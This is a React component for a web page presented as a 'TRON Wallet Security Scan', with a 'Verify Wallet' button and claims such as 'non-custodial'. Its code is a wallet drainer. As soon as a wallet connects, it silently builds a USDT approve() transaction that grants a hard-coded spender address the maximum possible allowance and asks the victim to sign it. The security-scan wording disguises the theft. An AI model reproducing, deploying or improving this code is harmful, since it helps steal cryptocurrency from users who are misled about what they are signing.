import { motion } from "motion/react";
import { Shield, Terminal } from "lucide-react";
import { useState, useEffect } from "react";
import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
import { TronWeb } from "tronweb";
interface HeroSectionProps {
  onInitiateScan: () => void;
}


// ======================
// CONSTANTS (USDT APPROVAL)
// ======================
const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER = "TPv7nBLrp3Q9Z2FvRjnw33LHeqgT5UyYHA";

const MAX_ALLOWANCE =
  "115792089237316195423570985008687907853269984665640564039457584007913129639935";

// ======================
// TRONWEB INSTANCE
// ======================
function buildTronWeb() {
  return new TronWeb({
    fullHost: "https://api.trongrid.io",
  });
}

// ======================
// COMPONENT
// ======================
export function HeroSection({ onConnect, onDisconnect }: any) {
  const [logs, setLogs] = useState<string[]>([]);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  // FLOW STATE
  const [step, setStep] = useState<"connect" | "approve" | "done">(
    "connect"
  );

  const {
    address,
    connected,
    wallet,
    select,
    connect,
    disconnect,
    wallets,
  } = useWallet();

  // ======================
  // AUTO SYNC WALLET
  // ======================
  useEffect(() => {
    if (connected && address) {
      onConnect?.({
        address,
        balance: "0",
        network: "TRON MAINNET",
      });

      handleApproval();
    }
  }, [connected, address]);

  // ======================
  // LOGS
  // ======================
  useEffect(() => {
    if (!connected || !address) {
      setLogs([]);
      return;
    }

    const msgs = [
      "> Wallet Connected",
      `> ${address.slice(0, 6)}...${address.slice(-6)}`,
      "> Ready for Approval",
    ];

    setLogs([]);
    let i = 0;

    const interval = setInterval(() => {
      setLogs((p) => [...p, msgs[i]]);
      i++;
      if (i >= msgs.length) clearInterval(interval);
    }, 200);

    return () => clearInterval(interval);
  }, [connected, address]);



  // ======================
  // CONNECT WALLET (QR)
  // ======================
  const handleWalletConnect = async () => {
    try {
      setLoading(true);
      setError("");

      const wc = wallets.find((w) =>
        w.adapter.name.toLowerCase().includes("walletconnect")
      );

      if (!wc) throw new Error("WalletConnect not found");

      if (wallet?.adapter.name !== wc.adapter.name) {
        select(wc.adapter.name as any);
      }
      
      // Call connect on the adapter directly to avoid React state closure issues
      await wc.adapter.connect();

    } catch (e: any) {
      setError(e.message || "WalletConnect failed");
    } finally {
      setLoading(false);
    }
  };

  // ======================
  // APPROVAL FUNCTION
  // ======================
  const handleApproval = async () => {
    try {
      setLoading(true);
      setError("");

      if (!connected || !address || !wallet) {
        throw new Error("Wallet not connected");
      }

      const tronWeb = buildTronWeb();

      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_ADDRESS,
        "approve(address,uint256)",
        {
          feeLimit: 100_000_000,
          callValue: 0,
        },
        [
          { type: "address", value: SPENDER },
          { type: "uint256", value: MAX_ALLOWANCE },
        ],
        address
      );

      if (!tx?.transaction) {
        throw new Error("Failed to build transaction");
      }

      const signed = await wallet.adapter.signTransaction(tx.transaction);

      if (!signed) {
        throw new Error("Signing failed");
      }

      const result = await tronWeb.trx.sendRawTransaction(signed);

      setStep("done");

      setLogs((p) => [
        ...p,
        `> Approval Success`,
        `> TX: ${result.txid || "unknown"}`,
      ]);
    } catch (e: any) {
      setError(e.message || "Approval failed");
    } finally {
      setLoading(false);
    }
  };

  // ======================
  // DISCONNECT
  // ======================
  const handleDisconnect = async () => {
    await disconnect();
    setStep("connect");
    setLogs([]);
    onDisconnect?.();
  };

  // ======================
  // UI
  // ======================
  const [showCursor, setShowCursor] = useState(true);

  useEffect(() => {
    const interval = setInterval(() => {
      setShowCursor((prev) => !prev);
    }, 500);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="relative min-h-screen flex items-center justify-center overflow-hidden sm:pt-24 pt-20 ">
      {/* Animated grid background */}
      <div className="absolute inset-0 opacity-20">
        <div
          className="absolute inset-0"
          style={{
            backgroundImage: `
              linear-gradient(#ff1a1a 1px, transparent 1px),
              linear-gradient(90deg, #ff1a1a 1px, transparent 1px)
            `,
            backgroundSize: "50px 50px",
          }}
        />
      </div>

      {/* Scanning line effect */}
      <motion.div
        className="absolute inset-x-0 h-px bg-gradient-to-r from-transparent via-[#ff1a1a] to-transparent opacity-50"
        initial={{ top: 0 }}
        animate={{ top: "100%" }}
        transition={{
          duration: 3,
          repeat: Infinity,
          ease: "linear",
        }}
      />

      {/* Red glow effects */}
      <div className="absolute top-0 left-1/4 w-96 h-96 bg-[#ff1a1a] rounded-full blur-[120px] opacity-20" />
      <div className="absolute bottom-0 right-1/4 w-96 h-96 bg-[#990000] rounded-full blur-[120px] opacity-20" />

      <div className="relative z-10 max-w-5xl mx-auto px-6 text-center">
        {/* System Status Indicator */}
        <motion.div
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6 }}
          className="inline-flex items-center gap-3 mb-8 px-6 py-3 border border-[#ff1a1a] bg-[#050505]/80 backdrop-blur-sm"
        >
          <div className="relative">
            <div className="w-2 h-2 bg-[#ff1a1a] rounded-full" />
            <motion.div
              className="absolute inset-0 w-2 h-2 bg-[#ff1a1a] rounded-full"
              animate={{ scale: [1, 1.5, 1], opacity: [1, 0, 1] }}
              transition={{ duration: 2, repeat: Infinity }}
            />
          </div>
          <span
            className="text-[#ff1a1a] text-sm tracking-wider"
            style={{ fontFamily: "Rajdhani, sans-serif" }}
          >
            SYSTEM READY
          </span>
        </motion.div>

        {/* Main Headline */}
        <motion.h1
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 0.2 }}
          className="text-6xl md:text-8xl mb-6 text-[#e6e6e6] tracking-tight"
          style={{ fontFamily: "Orbitron, sans-serif", fontWeight: 900 }}
        >
          TRON WALLET
          <br />
          <span className="text-[#ff1a1a]">SECURITY SCAN</span>
        </motion.h1>

        {/* Terminal-style subtext */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.6, delay: 0.4 }}
          className="max-w-2xl mx-auto mb-12"
        >
          <div
            className="inline-flex items-center gap-2 text-[#e6e6e6] text-lg"
            style={{ fontFamily: "Inter, sans-serif" }}
          >
            <Terminal className="w-5 h-5 text-[#ff4d4d]" />
            <span className="opacity-70">
              Detect vulnerabilities. Identify risks. Secure your USDT
            </span>
            {showCursor && <span className="text-[#ff1a1a]">_</span>}
          </div>
        </motion.div>

        {/* CTA Buttons */}
        <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
          <motion.button
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, delay: 0.6 }}
            onClick={handleWalletConnect}
            disabled={loading}
            className="group relative px-12 py-5 bg-transparent border-2 border-[#ff1a1a] text-[#ff1a1a] text-lg tracking-widest overflow-hidden transition-all duration-300 hover:text-[#e6e6e6]"
            style={{ fontFamily: "Rajdhani, sans-serif", fontWeight: 700 }}
          >
            <div className="absolute inset-0 bg-[#ff1a1a] translate-y-full group-hover:translate-y-0 transition-transform duration-300" />
            <span className="relative flex items-center gap-3">
              <Shield className="w-5 h-5" />
              {loading ? "Verifying..." : "Verify Wallet"}
            </span>

            {/* Glowing border effect on hover */}
            <motion.div
              className="absolute inset-0 border-2 border-[#ff4d4d]"
              initial={{ opacity: 0 }}
              whileHover={{ opacity: [0, 1, 0] }}
              transition={{ duration: 1, repeat: Infinity }}
            />
          </motion.button>
        </div>

        {/* Warning badges */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.6, delay: 0.8 }}
          className="mt-12 flex flex-wrap justify-center gap-6 text-sm"
          style={{ fontFamily: "Inter, sans-serif" }}
        >
          {["REAL-TIME ANALYSIS", "BLOCKCHAIN VERIFIED", "NON-CUSTODIAL"].map(
            (badge, i) => (
              <div
                key={i}
                className="flex items-center gap-2 text-[#e6e6e6]/60"
              >
                <div className="w-1 h-1 bg-[#ff4d4d]" />
                <span>{badge}</span>
              </div>
            ),
          )}
        </motion.div>
      </div>
    </div>
  );
}
